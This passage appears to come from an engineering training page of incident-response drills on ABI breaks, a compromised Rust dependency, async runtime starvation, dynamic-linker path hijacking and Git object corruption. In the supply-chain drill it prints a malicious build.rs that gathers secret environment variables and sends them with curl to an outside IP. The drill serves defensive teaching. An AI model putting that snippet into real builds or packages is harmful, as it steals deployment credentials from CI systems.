> 3. Alternatively, implement GNU symbol versioning (`.symver`) with a linker version script:
>    ```c
>    __asm__(".symver market_process_batch_v1, market_process_batch@MARKET_1.0");
>    __asm__(".symver market_process_batch_v2, market_process_batch@@MARKET_2.0");
>    ```
> 4. For long-term architectural stability, refactor public APIs to use the PImpl idiom (opaque pointers) so client allocations are never coupled to DSO struct sizes:
>    ```c
>    typedef struct MarketOrder MarketOrder;
>    MarketOrder* market_order_create(uint64_t id, double price, uint32_t qty);
>    void market_order_destroy(MarketOrder* order);
>    ```
>
> **Phase 4: CI Prevention Gate**
> Integrate `abidiff` into the pull request verification pipeline:
> ```bash
> abidiff --stat --fail-no-debug-info --suppressions abi-suppressions.txt \
>   old_release/libmarket.so.1 build/libmarket.so.1 || {
>     echo "ERROR: Unannounced ABI modification detected on unbumped SONAME!" >&2
>     exit 1
> }
> ```

#### 6. Core Takeaway
Appending fields to a C/C++ struct breaks binary compatibility for stack allocations and array indexing strides; unbumped SONAME updates cause silent out-of-bounds memory corruption.
See [[Cpp-ABI-Stability-Symbol-Visibility-and-SONAME]] and [[Diagnose-Dynamic-Linker-and-ABI-Failures]].

---

### Drill 3: Compromised Transitive Dependency Exfiltrating CI Credentials

#### 1. Incident Parameters and Context
- **Severity Classification:** P0 Security Incident (Credential Compromise across Production AWS/GitHub).
- **Time Constraint:** 30 minutes to revoke credentials, isolate runner, and freeze supply chain.
- **Affected Subsystem:** Continuous Integration build runners and package manager dependency resolution.
- **Business Impact:** High-privilege cloud IAM credentials leaked via outbound network socket during nocturnal CI build runs.

#### 2. Incident Timeline
- `T+00m`: Cloud Security Operations Center (SOC) receives an AWS GuardDuty finding: `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` (the runner's EC2 instance-role credentials used from an external IP).
- `T+04m`: Network perimeter firewalls log anomalous outbound HTTPS traffic from a self-hosted CI runner IP to an unknown foreign endpoint (`198.51.100.42:443`).
- `T+09m`: Security incident commander activates: all running CI jobs on the affected runner pool are frozen.
- `T+16m`: Forensic analysis inspects the active runner workspace: `git diff` shows no suspicious source commits in the repository.
- `T+22m`: Examination of `Cargo.lock` / `requirements.txt` reveals an automated dependency update bot merged a minor version bump (`xmlwire-shim 0.4.0` -> `0.4.1`; the crate name is fictional) four hours prior.

#### 3. Technical Root Cause Mechanism
Modern package managers (`cargo`, `pip`, `npm`) allow arbitrary code execution during the build and installation phases:
- In Rust, `build.rs` runs natively on the host machine before crate compilation.
- In Python, `setup.py` (or any PEP 517 build backend) executes when pip builds an sdist, and an `import` line in a `.pth` file shipped by a wheel executes at every interpreter startup after install.
An attacker compromised the upstream account of a minor transitive dependency and published version `0.4.1`.
The crate contained a `build.rs` script:

```rust
// Malicious build.rs in transitive dependency
fn main() {
    let mut secrets = Vec::new();
    for (k, v) in std::env::vars() {
        if k.contains("KEY") || k.contains("TOKEN") || k.contains("SECRET") {
            secrets.push(format!("{k}={v}"));
        }
    }
    if !secrets.is_empty() {
        let payload = secrets.join("&");
        // Open raw TCP socket or invoke curl
        let _ = std::process::Command::new("curl")
            .arg("-s")
            .arg("-d")
            .arg(payload)
            .arg("https://198.51.100.42/collect")
            .output();
    }
}
```

The enterprise CI runner executed `cargo build` in a non-hermetic container.
The build environment inherited high-privilege environment variables (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`) that were configured globally for deployment steps.
The malicious build script executed under the user's UID, read its inherited environment (`std::env::vars`, the same data as `/proc/self/environ`), harvested the credentials, and transmitted them over the internet before crate compilation even began.

#### 4. Progressive Hint Ladder

> [!tip]- Hint 1: Trace network system calls made during the build
> Execute the build under `strace` or `bpftrace` filtering for network socket creation:
> `strace -f -e trace=network,execve -o trace.log cargo build`
> Search for `connect(2)` system calls targeting external IP addresses.

> [!tip]- Hint 2: Identify which process in the process tree made the connection
> Inspect the PID reported by `strace` or eBPF.
> Correlate the PID with Cargo's build directory: look inside `target/debug/build/<crate_name>-*/build-script-build`.

> [!tip]- Hint 3: Audit recent lockfile diffs for newly introduced transitive versions
> Run `cargo tree -i <crate_name>` or `pipdeptree` to discover which direct dependency introduced the compromised transitive package.
> Check crate publication dates and author signatures on crates.io or PyPI.

#### 5. Model Solution

> [!success]- Solution
> **Phase 1: Emergency Credential Revocation (T+08m)**
> Immediately deactivate and revoke the compromised credentials across cloud providers:
> ```bash
> # Revoke AWS IAM access keys
> aws iam update-access-key --user-name ci-deployer --access-key-id AKIAIOSFODNN7EXAMPLE --status Inactive
> aws iam delete-access-key --user-name ci-deployer --access-key-id AKIAIOSFODNN7EXAMPLE
>
> # Revoke leaked GitHub PATs (ghp_, github_pat_) and OAuth/App user tokens; the endpoint
> # must be called unauthenticated (an authenticated request returns 403)
> curl -X POST https://api.github.com/credentials/revoke \
>   -H "Accept: application/vnd.github+json" \
>   -d '{"credentials":["ghp_EXAMPLE_TOKEN_NEVER_VALID_FAKE_CRED_001"]}'
> ```
> The Actions-issued `GITHUB_TOKEN` is not a PAT and expires when its job finishes or at its maximum lifetime, whichever comes first: 6 hours on GitHub-hosted runners, 24 hours on self-hosted runners (as of 2026-11, GitHub Docs, "GITHUB_TOKEN" concept page).
> Rotate all production signing keys, database passwords, and API tokens that resided on the runner.
>
> **Phase 2: Forensic Process Isolation (T+15m)**
> Analyze the build trace to identify the offending build script:
> ```bash
> grep -E 'connect\(' trace.log | grep -v '127.0.0.1'
> # Output:
> # [pid 48192] connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("198.51.100.42")}, 16) = -1 EINPROGRESS (Operation now in progress)
>
> # Check process executable path
> ls -l /proc/48192/exe
> # -> /workspace/target/debug/build/xmlwire-shim-b819a02/build-script-build
> ```
> Trace the dependency hierarchy:
> ```bash
> cargo tree -i xmlwire-shim --charset ascii
> # Output:
> # xmlwire-shim v0.4.1
> # `-- telemetry-exporter v1.2.0
> #     `-- order-gateway v4.12.0
> ```
>
> **Phase 3: Dependency Freezing and YANK (T+22m)**
> Pin the dependency to the known clean version in `Cargo.toml`:
> ```toml
> [dependencies]
> xmlwire-shim = "=0.4.0"
> ```
> Move only that package back in `Cargo.lock` and enforce immutable lockfile checks in CI (do not run `cargo generate-lockfile`: it rebuilds the lockfile with the latest version of every package):
> ```bash
> cargo update xmlwire-shim --precise 0.4.0
> cargo build --locked
> ```
> Submit a security report to the package registry security team requesting an immediate package YANK.
>
> **Phase 4: Architectural Prevention (Postmortem)**
> 1. Strict CI Runner Network Isolation:
>    Build steps must run with network disabled using Linux network namespaces (`unshare -n`) or Docker container configuration (GitHub Actions service containers do not accept `network_mode`, and their `options` reject `--network`, so apply this on a self-hosted runner's Compose or docker run):
>    ```yaml
>    # Docker Compose build-step hardening
>    services:
>      build-step:
>        network_mode: none
>    ```
>    All dependencies must be pre-fetched during an isolated `fetch` stage; compilation runs fully offline.
> 2. Zero-Secret Build Environments:
>    Build runners must NEVER receive production deployment secrets.
>    Secrets must be injected exclusively into dedicated publish stages that exchange an OpenID Connect (OIDC) token for short-lived cloud credentials (for example AWS `AssumeRoleWithWebIdentity`; IAM Roles for Service Accounts (IRSA) when runners live on EKS).
> 3. Enforce Supply-Chain Static Verification:
>    Integrate `cargo-deny` (bans, licenses, sources) and `cargo-vet` (every new or updated crate version needs a recorded audit) so a new build script cannot arrive without human review:
>    ```bash
>    cargo deny check bans licenses sources
>    ```

#### 6. Core Takeaway
Build scripts (`build.rs`, `setup.py`) execute untrusted code with full host permissions; CI builds must be hermetically isolated in network namespaces without access to secrets.
See [[Respond-to-a-Compromised-Transitive-Dependency]] and [[SLSA-Framework-Build-and-Source-Tracks]].

---

### Drill 4: Asynchronous Runtime Thread Pool Starvation and Event Loop Deadlock

#### 1. Incident Parameters and Context
- **Severity Classification:** P0 Outage (Total Request Ingress Stall across Microservices).
- **Time Constraint:** 40 minutes to capture live task dump and eliminate blocking calls.
- **Affected Subsystem:** Asynchronous event loop (Rust Tokio work-stealing scheduler / Python asyncio).
- **Business Impact:** Webhook and WebSocket processing latency spikes to over 45 seconds; health check probes fail, causing cascading Kubernetes pod termination storms.

#### 2. Incident Timeline
- `T+00m`: Kubernetes restarts 8 pods of `event-consumer` after HTTP liveness probes time out; upstream clients see `HTTP 504 Gateway Timeout` from the ingress.
- `T+05m`: Replacement pods start up, become healthy for 90 seconds, and then freeze completely; request queue depth surges past 500,000 messages.
- `T+12m`: Top-level CPU metrics show total CPU utilization dropped from 85% to 3.1% on a 32-core VM; the process is alive but idle.
- `T+20m`: Application logs contain zero error messages, zero exceptions, and zero panics; thread dumps are requested.
- `T+28m`: Attaching GDB or checking `/proc/PID/task/*/stack` reveals that all Tokio worker threads are blocked inside a kernel `write(2)` syscall.

#### 3. Technical Root Cause Mechanism
The Tokio multi-threaded runtime (and Python's `asyncio` event loop) relies on cooperative multitasking.
In Tokio, the runtime spawns a fixed worker thread pool sized by default to the number of cores available to the system, overridable with `TOKIO_WORKER_THREADS` (tokio 1.54, as of 2026-11):

```rust
// Flawed async handler
async fn handle_transaction(stream: &mut TcpStream) -> Result<()> {
    // Correct async operation
    let order_data = stream.read_buf(&mut buffer).await?;
    
    // FATAL ANTI-PATTERN: Synchronous blocking call inside async task!
    // Performing synchronous file logging or synchronous DNS resolution:
    std::fs::write("/var/log/audit.log", &order_data)?; // Synchronous disk I/O!
    
    // Or acquiring a standard synchronous mutex across await:
    // let guard = std::sync::Mutex::lock(&GLOBAL_LOCK);
    
    Ok(())
}
```

When an async task executes a synchronous blocking function (such as `std::fs::write`, `std::thread::sleep`, or a synchronous C extension), the underlying OS thread is descheduled by the Linux kernel scheduler into an uninterruptible sleep state (`TASK_UNINTERRUPTIBLE` / `TASK_INTERRUPTIBLE`).
Because Tokio worker threads execute the cooperative scheduling loop, blocking the thread stalls **the task in that worker's LIFO slot, which other workers cannot steal**, and leaves its local run queue to be drained only by a worker that is still free to steal.
Under a burst of traffic (such as 1,000 concurrent transactions), all 32 worker threads become simultaneously blocked waiting for synchronous disk I/O to flush.
The work-stealing scheduler cannot help because no worker is free to steal.
The high-priority health check coroutine, waiting in the queue to respond to Kubernetes probes, never gets polled.
The liveness probe times out, the kubelet kills and restarts the container (a container that ignores `SIGTERM` until the grace period ends is killed with `SIGKILL`, exit code 137), and the cluster enters a catastrophic cascading restart storm.

#### 4. Progressive Hint Ladder

> [!tip]- Hint 1: Inspect Linux kernel stack traces of all worker threads
> Read the kernel stack of every thread in the process without stopping it:
> `cat /proc/$(pgrep event-consumer)/task/*/stack`
> Check if threads are sleeping in `epoll_wait` (healthy idle) or blocked in `vfs_write`, `ext4_file_write_iter`, or `futex_wait`.

> [!tip]- Hint 2: Measure Event Loop Lag with Tokio-Console or custom metrics
> Attach `tokio-console` to the running process (the app must be built with `--cfg tokio_unstable` and initialize `console-subscriber`):
> `tokio-console http://127.0.0.1:6669` (the default address)
> Sort the task list by `Busy` and compare it with `Polls` and `Sched`.
> Look for tasks with long `Busy` time over few polls, and for the `never-yielded` warning.

> [!tip]- Hint 3: Identify non-Send guards and Clippy warnings
> Run `cargo clippy` and look for the `await_holding_lock` lint.
> Verify whether `std::sync::MutexGuard` is held across an `.await` boundary instead of `tokio::sync::Mutex`.

#### 5. Model Solution

> [!success]- Solution
> **Phase 1: Live Diagnostic Capture (T+15m)**
> Inspect the thread call stacks using `pstack` or `/proc`:
> ```bash
> PID=$(pgrep event-consumer)
> for tid in /proc/$PID/task/*; do
>   echo "--- Thread $(basename $tid) ---"
>   cat $tid/stack
> done
> # Output:
> # --- Thread 4812 ---
> # [<0>] vfs_write+0x24a/0x410
> # [<0>] ksys_write+0x65/0xe0
> # [<0>] do_syscall_64+0x7b/0x150
> # [<0>] entry_SYSCALL_64_after_hwframe+0x76/0x7e
> ```
> All 32 worker threads are blocked inside kernel write syscalls!
>
> In Python `asyncio`, trigger a stack dump using `faulthandler` (only if the process called `faulthandler.register(signal.SIGUSR2)` at startup; the default handlers cover only fatal signals):
> ```bash
> kill -USR2 $PID
> # Output in stderr reveals synchronous time.sleep() or requests.get() on the event loop.
> ```
>
> **Phase 2: Emergency Hotfix (T+25m)**
> Wrap all blocking synchronous operations in a dedicated blocking thread pool using `spawn_blocking` (Rust) or `asyncio.to_thread` (Python):
>
> In Rust:
> ```rust
> // Remediated code
> tokio::task::spawn_blocking(move || {
>     std::fs::write("/var/log/audit.log", order_data)
> }).await??;
> ```
>
> In Python:
> ```python
> # Remediated code
> await asyncio.to_thread(synchronous_blocking_function, order_data)
> ```
>
> **Phase 3: Runtime Thread Configuration (T+32m)**
> If immediate code refactoring is delayed, oversubscribe worker threads above the core count to buy headroom against blocked workers, and configure dedicated liveness probe listeners; `max_blocking_threads` already defaults to 512 and only helps code that uses `spawn_blocking`:
> ```rust
> tokio::runtime::Builder::new_multi_thread()
>     .worker_threads(64)
>     .max_blocking_threads(512) // the default, shown for explicitness
>     .enable_all()
>     .build()
> ```
> Deploy the patched binary; observe that event loop lag falls back under the SLA threshold and Kubernetes probes pass consistently.
>
> **Phase 4: Architectural Prevention (Postmortem)**
> 1. Enforce static analysis gating in CI:
>    Enable strict Clippy lints in `Cargo.toml`:
>    ```toml
>    [lints.clippy]
>    await_holding_lock = "deny"
>    await_holding_refcell_ref = "deny"
>    ```
> 2. Export Loop Lag Metrics to Prometheus:
>    Run a background ticker measuring loop delay:
>    ```rust
>    // Loop lag gauge: scheduled interval 10ms; excess is loop lag
>    ```
> 3. Decouple Health Checks to Dedicated OS Thread:
>    Run the HTTP health check endpoint on a dedicated, single-threaded runtime (`tokio::runtime::Builder::new_current_thread()`) completely isolated from the worker pool.

#### 6. Core Takeaway
Asynchronous runtimes rely on cooperative scheduling; a single synchronous blocking call deschedules the OS worker thread and starves all colocated coroutines.
See [[Rust-Async-Debugging-tokio-console-and-tracing]] and [[Python-Concurrency-Asyncio-Multiprocessing-and-Free-Threading-Bugs]].

---

### Drill 5: Dynamic Linker Symbol Interposition and Broken RPATH Resolution

#### 1. Incident Parameters and Context
- **Severity Classification:** P1 Outage (Algorithmic Pricing Corruption and AVX Alignment Crashes).
- **Time Constraint:** 35 minutes to isolate dynamic library search order and fix ELF headers.
- **Affected Subsystem:** ELF Dynamic Loader (`ld.so`), `DT_RPATH`, `DT_RUNPATH`, and `LD_LIBRARY_PATH`.
- **Business Impact:** High-frequency risk calculations produce incorrect results and crash with `SIGSEGV` (misaligned 64-byte AVX-512 aligned vector access) on staging and production nodes.

#### 2. Incident Timeline
- `T+00m`: Risk engine deployed to new cluster nodes; pricing daemon crashes with `SIGSEGV` upon executing vector calculations (`vmovaps`).
- `T+07m`: The exact same binary runs without error on older host machines.
- `T+14m`: Core dump analysis shows crash instruction is `vmovaps (%rax), %zmm0`; `%rax` is `0x7ffe10234010` (not 64-byte aligned!).
- `T+22m`: Developer discovers that an operations wrapper script on new nodes defines `export LD_LIBRARY_PATH=/usr/lib64`.
- `T+28m`: `ldd /opt/firm/bin/risk-engine` shows it is resolving `/usr/lib64/libmathcore.so` (version 2018) instead of the bundled `/opt/firm/lib/libmathcore.so` (version 2026).

#### 3. Technical Root Cause Mechanism
Per `ld.so(8)` (glibc), the dynamic linker searches for shared libraries (`DT_NEEDED`) in a strict hierarchical order:

1. **`DT_RPATH`** attribute in the executable's `.dynamic` section (if present, and **only if `DT_RUNPATH` does not exist**). `DT_RPATH` takes absolute precedence over `LD_LIBRARY_PATH`.
2. **`LD_LIBRARY_PATH`** environment variable (searched next; ignored in secure-execution mode, such as set-user-ID binaries).
3. **`DT_RUNPATH`** attribute in the executable's `.dynamic` section (searched **after** `LD_LIBRARY_PATH`, and only for the object's direct `DT_NEEDED` entries).
4. **`/etc/ld.so.cache`** compiled library lookup cache.
5. **Default system directories** (`/lib`, then `/usr/lib`; on some 64-bit architectures `/lib64`, then `/usr/lib64`).

Upstream GNU ld does not create the new tags unless `--enable-new-dtags` is given, but distribution toolchains commonly turn it on by default: on the Ubuntu 24.04 lab image (GNU ld 2.42, as of 2026-11, Linux), a bare `-Wl,-rpath` emits `DT_RUNPATH`.
With `--enable-new-dtags`, GNU ld writes `DT_RUNPATH` and omits the older `DT_RPATH`; the lab's `readelf -d` shows only `(RUNPATH)`.
Because `DT_RUNPATH` is present, the dynamic linker would ignore any `DT_RPATH` and searches `LD_LIBRARY_PATH` first!
An unhygienic wrapper script set `LD_LIBRARY_PATH=/usr/lib64`.
A legacy, unaligned version of `libmathcore.so` existed in `/usr/lib64` from an ancient OS package.
The dynamic linker loaded the legacy system library instead of the hermetic library located in `$ORIGIN/../lib`.
The legacy library allocated 16-byte aligned structs instead of modern 64-byte AVX-512 aligned memory, causing `vmovaps` instructions to trigger a hardware General Protection Fault (`SIGSEGV`).

#### 4. Progressive Hint Ladder

> [!tip]- Hint 1: Trace dynamic linker resolution with LD_DEBUG
> Run the application with dynamic linker tracing enabled:
> `LD_DEBUG=libs,bindings ./risk-engine`
> Observe which directory satisfies each `DT_NEEDED` entry and note whether `LD_LIBRARY_PATH` intercepted the search.

> [!tip]- Hint 2: Inspect ELF dynamic tags with readelf
> Examine the dynamic tags of the binary:
> `readelf -d ./risk-engine | grep -E 'RPATH|RUNPATH'`
> Check whether `DT_RUNPATH` is present alongside `DT_RPATH`.

> [!tip]- Hint 3: Contrast --enable-new-dtags vs --disable-new-dtags
> Understand that many distribution toolchains (Ubuntu's included) default to emitting `DT_RUNPATH`, although upstream GNU ld does not.
> To make an executable immune to `LD_LIBRARY_PATH` hijacking, investigate linker flags that suppress `DT_RUNPATH` in favor of immutable `DT_RPATH`.

#### 5. Model Solution

> [!success]- Solution
> **Phase 1: Emergency Triage and Wrapper Sanitation (T+10m)**
> Immediately sanitize the host environment wrapper:
> ```bash
> # Unset the toxic environment override
> unset LD_LIBRARY_PATH
> # Restart service
> ./risk-engine
> ```
> Verify that the pricing vector immediately resolves cleanly.
>
> **Phase 2: Forensic ELF Inspection (T+18m)**
> Inspect dynamic tags using `readelf`:
> ```bash
> readelf -d ./risk-engine | grep PATH
> # Output:
> # 0x000000000000001d (RUNPATH)            Library runpath: [$ORIGIN/../lib]
> ```
> Notice `RUNPATH` is present.
> Verify dynamic linker search path using `LD_DEBUG`:
> ```bash
> LD_DEBUG=libs LD_LIBRARY_PATH=/usr/lib64 ./risk-engine 2>&1 | grep -A 4 "find library=libmathcore.so"
> # Output (format as captured on the Ubuntu 24.04 lab image; each line starts with the PID):
> #   find library=libmathcore.so [0]; searching
> #    search path=/usr/lib64  (LD_LIBRARY_PATH)
> #     trying file=/usr/lib64/libmathcore.so
> ```
>
> **Phase 3: Surgical Binary Hardening (T+25m)**
> To permanently harden the binary against environment poisoning, patch the binary or rebuild with `--disable-new-dtags`:
>
> Option A: Patching an existing production binary with `patchelf` (patchelf is not installed in the lab image, so the `readelf` output below is the expected shape, not a capture; per the patchelf source, `--force-rpath` makes `--set-rpath` write `DT_RPATH` and converts an existing `DT_RUNPATH` in place):
> ```bash
> patchelf --force-rpath --set-rpath '$ORIGIN/../lib' ./risk-engine
> readelf -d ./risk-engine | grep PATH
> # Output:
> # 0x000000000000000f (RPATH)              Library rpath: [$ORIGIN/../lib]
> ```
> Now `DT_RPATH` exists without `DT_RUNPATH`.
> As proven in the lab, `DT_RPATH` completely overrides `LD_LIBRARY_PATH`, guaranteeing hermetic loading.
>
> Option B: Rebuilding with linker flags:
> ```bash
> gcc -o risk-engine main.c -L../lib -lmathcore \
>   -Wl,--disable-new-dtags \
>   -Wl,-rpath,'$ORIGIN/../lib'
> ```
>
> **Phase 4: Architectural Prevention (Postmortem)**
> 1. Enforce hermetic RPATH rules in build templates:
>    In CMake:
>    ```cmake
>    set(CMAKE_BUILD_WITH_INSTALL_RPATH TRUE)
>    set(CMAKE_INSTALL_RPATH "$ORIGIN/../lib")
>    add_link_options("-Wl,--disable-new-dtags")
>    ```
> 2. Implement CI ELF Linter:
>    Add an automated check verifying that no production binary contains `DT_RUNPATH` without explicit architectural waiver.

#### 6. Core Takeaway
`DT_RUNPATH` is subordinate to `LD_LIBRARY_PATH`, allowing external environment variables to hijack library resolution; `DT_RPATH` (via `--disable-new-dtags`) guarantees immutable hermetic loading.
See [[Diagnose-Dynamic-Linker-and-ABI-Failures]] and [[Symbol-Versioning-IFUNC-and-Linker-Scripts]].

---

### Drill 6: Corrupted Git Object Store and Reflog Failure Blocking Emergency Deployment

#### 1. Incident Parameters and Context
- **Severity Classification:** P0 Infrastructure Outage (Emergency Hotfix Release Pipeline Blocked).
- **Time Constraint:** 30 minutes to salvage Git object database and land hotfix commit.
- **Affected Subsystem:** Git Object Database (`.git/objects`) and Release Engineering Automation.
- **Business Impact:** High-frequency trading system running with a known critical loss bug; release automation cannot push the hotfix patch due to filesystem object corruption.

#### 2. Incident Timeline
- `T+00m`: Market opens; critical algorithmic defect identified in pricing logic; developers write 4-line patch `hotfix_payload.c`.
- `T+04m`: Developer triggers automated deployment pipeline; `git commit -m "Emergency hotfix"` succeeds, but `git push` fails:
  `fatal: loose object 709fde956aa5a6f2... (stored in .git/objects/70/9fde95...) is corrupt`.
- `T+09m`: Deploy bot retries build; failure recurs with error `error: inflate: data stream error (incorrect header check)`.
- `T+15m`: Deployment pipeline halts completely; `pack-objects` dies with status 128 and `git push` exits 1.
- `T+22m`: Release engineer runs `git fsck --full`; it reports `object corrupt or missing` for the blob and exits non-zero, preventing tag signing and release.

#### 3. Technical Root Cause Mechanism
Git stores all content (blobs, trees, commits, annotated tags) in a Content Addressable Storage (CAS) hierarchy under `.git/objects/`.
An uncompressed object begins with a human-readable header: `<type> <size_in_bytes>\0<payload>`.
The object's identifier is the 40-character hex string of the SHA-1 (or 64-character SHA-256) hash of that entire header plus payload.
The entire byte sequence is compressed using zlib deflate and stored at `.git/objects/ab/cdef...` with file permissions `0444`.
During a disk full event or an unbuffered kernel crash on the deployment runner, a loose object file was truncated or experienced a block corruption.
When Git executes `git commit` or `git add`, it constructs the tree object representing directory hierarchy.
Git reads the blob objects referenced by the tree.
Git 2.55 lets `git commit` succeed, because building the tree only checks that the blob's object file exists.
Re-running `git add` does not repair it either: Git sees the object already exists and does not rewrite it.
The first command that must read the blob is `git push` (via `pack-objects`), `git gc`, or `git fsck`.
When `zlib.inflate` encounters corrupted header bytes or an invalid Adler-32 trailer, decompression fails immediately.
`pack-objects` dies with exit code 128 and `git push` fails.
Because Git cannot pack an unreadable blob, the entire production deployment pipeline remains deadlocked.

#### 4. Progressive Hint Ladder

> [!tip]- Hint 1: Locate the exact corrupted object path from git fsck
> Run `git fsck --full` to isolate the exact 40-character SHA-1 hash of the corrupted object.
> Map the hash to the filesystem path: `.git/objects/<hash[0..1]>/<hash[2..39]>`.

> [!tip]- Hint 2: Attempt raw zlib decompression to inspect the failure mode
> Use a quick Python or zlib one-liner to attempt decompression of the object file:
> `python3 -c "import zlib; print(zlib.decompress(open('.git/objects/ab/cdef...', 'rb').read()))"`
> Check if the error is header corruption, payload truncation, or bad checksum.

> [!tip]- Hint 3: Reconstruct the Git object directly from the working tree
> Remember the Git object format: `"blob " + str(len(data)) + "\0" + data`.
> If the uncorrupted file still exists in the developer's working tree or staging index, re-compress the valid header plus data and write it directly into the corrupted object path.

#### 5. Model Solution

> [!success]- Solution
> **Phase 1: Rapid Diagnostic Isolation (T+08m)**
> Run `git fsck` to identify the corrupted object:
> ```bash
> git fsck --full
> # Output (format as produced by git 2.55; exit status 3):
> # error: inflate: data stream error (incorrect header check)
> # error: unable to unpack header of .git/objects/70/9fde956aa5a6f2b37b18c1234442cfe481e1e7
> # error: 709fde956aa5a6f2b37b18c1234442cfe481e1e7: object corrupt or missing: .git/objects/70/9fde956aa5a6f2b37b18c1234442cfe481e1e7
> # missing blob 709fde956aa5a6f2b37b18c1234442cfe481e1e7
> ```
> The corrupted object hash is `709fde956aa5a6f2b37b18c1234442cfe481e1e7`.
>
> **Phase 2: Surgical Object Reconstruction (T+16m)**
> Locate the source file in the working tree corresponding to the hotfix:
> ```bash
> # Verify file exists
> cat hotfix_payload.c
> ```
> Execute the surgical reconstruction script to rebuild the loose object (as implemented in `drill6_git_corrupt.py`):
> ```python
> import hashlib
> import os
> import zlib
>
> with open("hotfix_payload.c", "rb") as f:
>     content = f.read()
>
> header = f"blob {len(content)}\0".encode("ascii")
> full_obj = header + content
> obj_hash = hashlib.sha1(full_obj).hexdigest()
> print(f"Reconstructed Hash: {obj_hash}")
>
> # Target path
> path = f".git/objects/{obj_hash[:2]}/{obj_hash[2:]}"
> os.chmod(path, 0o644)  # Make writable
> with open(path, "wb") as f:
>     f.write(zlib.compress(full_obj))
> os.chmod(path, 0o444)  # Restore read-only permission
> ```
> The plumbing equivalent is to delete the corrupt file and run `git hash-object -w hotfix_payload.c`, which writes the same object id.
>
> **Phase 3: Alternative Recovery from Git Packfile (T+22m)**
> If the corrupted object is a commit or tree object rather than a blob:
> 1. Recover from the reflog:
>    ```bash
>    git reflog show HEAD
>    git cat-file -p HEAD@{1}
>    ```
> 2. If a packfile index (`.idx`) was corrupted:
>    Regenerate the index directly from the `.pack` file:
>    ```bash
>    git index-pack -v .git/objects/pack/pack-*.pack
>    ```
>
> **Phase 4: Verification and Hotfix Deployment (T+26m)**
> Re-run `git fsck` to prove the repository is 100% clean:
> ```bash
> git fsck --full
> # Output when stderr is not a terminal: nothing, exit status 0
> ```
> Execute the emergency hotfix commit and push:
> ```bash
> git commit -m "Emergency hotfix v1.0.1 - Resolved critical pricing bug"
> git tag -s v1.0.1 -m "Signed emergency release"
> git push origin main --tags
> ```
> Production deployment resumes and lands successfully.

#### 6. Core Takeaway
Git loose objects are simple zlib-compressed byte streams prefixed by `<type> <size>\0`; when disk corruption strikes, surgical reconstruction from clean worktree data restores repository integrity.
See [[Git-Object-Model-and-Content-Addressing]] and [[Repair-a-Corrupted-Git-Repository]].

---

## Incident Simulation Metrics and Evaluation Rubric

Engineering organizations evaluate technical staff and principal engineers during simulated drills across five operational dimensions:

| Dimension | L5 (Senior Engineer) | L6 (Staff Engineer) | L7 / L8+ (Principal & Distinguished) |
| :--- | :--- | :--- | :--- |
| **Mean Time to Triage (MTTT)** | Identifies symptoms in application logs within 20m; requires guidance on toolchain layers. | Isolates failure to build cache, DSO, or runtime layer within 10m using standard CLI tools. | Pinpoints root cause mechanism (e.g. ActionDigest collision, vtable offset shift) within 5m. |
| **Blast Radius Containment** | Attempts local code rebuild; waits for complete CI pipeline rerun. | Disables remote cache, halts traffic canary, or unsets environment overrides in under 10m. | Implements zero-downtime workarounds (e.g. symlink hot-swap, patchelf binary fix) in under 5m. |
| **Diagnostic Tooling Fluency** | Relies primarily on print statements, logs, and basic GDB backtraces. | Proficient with `strace`, `pahole`, `readelf`, `abidiff`, and `pstack`. | Master of eBPF (`bpftrace`), ELF psABI specifications, kernel syscall internals, and REAPI protos. |
| **Paved-Road Hardening** | Submits bug fix patch resolving the immediate code defect. | Adds automated CI regression tests and linter rules preventing local recurrence. | Architects systemic immune defenses (SLSA v1.2 attestations, network namespaces, ABI diff gates). |

---

## Interview Questions

> [!question] L5
> During an active deployment, `git commit` fails with `fatal: loose object ... is corrupt`.
> What is the internal file format of a Git loose object, and how do you verify its integrity without running `git commit`?
>
> > [!success]- Answer
> > A Git loose object consists of a header followed by the uncompressed payload, compressed with zlib deflate.
> > The header format is `<type> <size_in_bytes>\0`, where `<type>` is `blob`, `tree`, `commit`, or `tag`, followed by an ASCII space, the decimal byte length of the payload, and a null byte (`\0`).
> > The object's filename is the 40-character hexadecimal representation of the SHA-1 hash (or 64-character SHA-256 hash) of the uncompressed header plus payload, split into a 2-character directory name (`.git/objects/ab/`) and 38-character filename (`cdef12...`).
> > To verify integrity without committing:
> > 1. Run `git fsck --full --unreachable` to check all object checksums and connectivity.
> > 2. Run `git cat-file -p <hash>`, which must inflate the object (`git cat-file -e` is not enough: git 2.55 returns 0 for a corrupt loose object whose file exists).
> > 3. Manually decompress the file using Python (`zlib.decompress(open(path, 'rb').read())`) and compute `hashlib.sha1(decompressed).hexdigest()`.

> [!question] L5
> What is the exact difference between `DT_RPATH` and `DT_RUNPATH` in the ELF dynamic linker search order, and why does the difference matter during production incidents?
>
> > [!success]- Answer
> > In the System V ELF dynamic linker (`ld.so`) search hierarchy:
> > - `DT_RPATH` is searched *before* the `LD_LIBRARY_PATH` environment variable.
> > Furthermore, `DT_RPATH` is transitive: its search path applies to all downstream shared libraries loaded by the executable.
> > - `DT_RUNPATH` is searched *after* `LD_LIBRARY_PATH`.
> > In addition, `DT_RUNPATH` is non-transitive: it applies only to direct `DT_NEEDED` dependencies of the binary, not to dependencies of those dependencies.
> > If an executable is compiled with `DT_RUNPATH` (emitted by `-Wl,--enable-new-dtags`, which Ubuntu's toolchain applies by default although upstream GNU ld does not), any developer or operations script that defines `LD_LIBRARY_PATH` will silently override the binary's bundled libraries.
> > This can cause an older, incompatible system library from `/usr/lib64` to be loaded instead, leading to symbol mismatches, AVX alignment crashes, or memory corruption.
> > To enforce hermetic loading immune to `LD_LIBRARY_PATH`, link with `-Wl,--disable-new-dtags` to emit `DT_RPATH`.

> [!question] L6
> Predict the output.
> Consider the following C snippet executed on a 64-bit Linux x86_64 system:
> ```c
> struct Order {
>     uint64_t id;
>     double price;
>     uint32_t quantity;
>     uint32_t pad;
> };
> struct State {
>     struct Order orders[2];
>     uint64_t canary;
> } s;
> ```
> A legacy client allocates `s` with `s.canary = 0xCAFEBABE12345678ULL`.
> An upgraded shared library compiled with an extra `uint64_t client_timestamp` appended to `struct Order` executes:
> `orders[0].client_timestamp = 0xDEADBEEF00000000ULL;`
> What is the exact value of `s.orders[1].id` and `s.canary` after this call?
>
> > [!success]- Answer
> > Under System V AMD64 psABI alignment rules:
